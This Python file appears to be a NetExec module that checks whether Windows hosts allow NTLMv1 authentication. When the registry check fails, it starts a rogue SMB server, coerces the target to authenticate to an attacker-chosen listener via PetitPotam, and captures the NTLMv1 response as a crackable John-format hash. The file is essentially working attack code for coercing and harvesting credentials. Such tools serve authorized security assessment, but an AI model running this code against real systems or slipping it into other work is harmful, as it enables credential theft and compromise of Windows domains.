from impacket.dcerpc.v5 import rrp
from impacket.examples.secretsdump import RemoteOperations
from impacket.dcerpc.v5.rrp import DCERPCSessionError, DCERPCException
from impacket import smbserver
from nxc.modules.petitpotam import coerce, efs_rpc_open_file_raw
from multiprocessing import Process
import time

class NXCModule:
    """
    Detect if the target's LmCompatibilityLevel will allow NTLMv1 authentication
    Module by @Tw1sm
    Modified by Deft (08/02/2024)
    Modified by PandHacker (17/04/2024)
    """

    name = "ntlmv1"
    description = "Detect if lmcompatibilitylevel on the target is set to lower than 3 (which means ntlmv1 is enabled)"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        self.output = "NTLMv1 allowed on: {} - LmCompatibilityLevel = {}"

        if not "LISTENER" in module_options:
            context.log.fail("LISTENER option not specified!")
            exit(1)

        self.listener = module_options["LISTENER"]
        self.timeout = 5 if not "TIMEOUT" in module_options else module_options["TIMEOUT"]

    @staticmethod
    def smbserver_proc(smbServer: smbserver.SimpleSMBServer, context):
        smbServer.start()
        message = str(smbServer._SimpleSMBServer__server._SMBSERVER__activeConnections)
        if message.startswith('VULNERABLE'):
            context.log.highlight(smbServer._SimpleSMBServer__server._SMBSERVER__activeConnections)

    @staticmethod
    def connection_handler(smbServer, connData, domain_name, user_name, host_name):
        if len(connData['AUTHENTICATE_MESSAGE']['ntlm']) <= 24:
            smbServer._SMBSERVER__activeConnections = 'VULNERABLE: ' + smbserver.outputToJohnFormat(
                connData['CHALLENGE_MESSAGE']['challenge'], connData['AUTHENTICATE_MESSAGE']['user_name'], 
                connData['AUTHENTICATE_MESSAGE']['domain_name'],
                connData['AUTHENTICATE_MESSAGE']['lanman'],
                connData['AUTHENTICATE_MESSAGE']['ntlm']
            )['hash_string']
        smbServer.shutdown()

    def on_login(self, context, connection):
        try:
            remote_ops = RemoteOperations(connection.conn, False)
            remote_ops.enableRegistry()

            if remote_ops._RemoteOperations__rrp:
                ans = rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)
                reg_handle = ans["phKey"]
                ans = rrp.hBaseRegOpenKey(
                    remote_ops._RemoteOperations__rrp,
                    reg_handle,
                    "SYSTEM\\CurrentControlSet\\Control\\Lsa",
                )
                key_handle = ans["phkResult"]
                rtype = data = None
                try:
                    rtype, data = rrp.hBaseRegQueryValue(
                        remote_ops._RemoteOperations__rrp,
                        key_handle,
                        "lmcompatibilitylevel\x00",
                    )

                except rrp.DCERPCSessionError:
                    context.log.debug("Unable to reference lmcompatabilitylevel, which probably means ntlmv1 is not set")

                # Changed by Defte
                # Unless this keys is set to 3 or higher, NTLMv1 can be used
                if data in [0, 1, 2]:
                    context.log.highlight(self.output.format(connection.conn.getRemoteHost(), data))

        except (DCERPCSessionError, DCERPCException) as e:
            context.log.highlight(f"Error connecting to RemoteRegistry: {e}")

            server = smbserver.SimpleSMBServer()
            server.setSMBChallenge('')
            server.setAuthCallback(self.connection_handler)
            
            server_proc = Process(target=self.smbserver_proc, args=(server, context))
            context.log.highlight(f"Starting SMBServer...")
            server_proc.start()

            context.log.highlight(f"Triggering authentication with PetitPotam")
            dce = coerce(
                connection.username,
                password=connection.password,
                domain=connection.domain,
                lmhash=connection.lmhash,
                nthash=connection.nthash,
                aesKey=connection.aesKey,
                target=connection.host if not connection.kerberos else connection.hostname + "." + connection.domain,
                pipe="lsarpc",
                do_kerberos=connection.kerberos,
                dc_host=connection.kdcHost,
                target_ip=connection.host,
                context=context
            )
            petitpotam_proc = Process(target=efs_rpc_open_file_raw, args=(dce, self.listener, context))
            petitpotam_proc.start()

            start = time.time()
            while time.time() - start < self.timeout:
                if not server_proc.is_alive():
                    break
                time.sleep(.1)
            else:
                server_proc.terminate()

            server_proc.join()
            petitpotam_proc.terminate()
            petitpotam_proc.join()
        finally:
            remote_ops.finish()
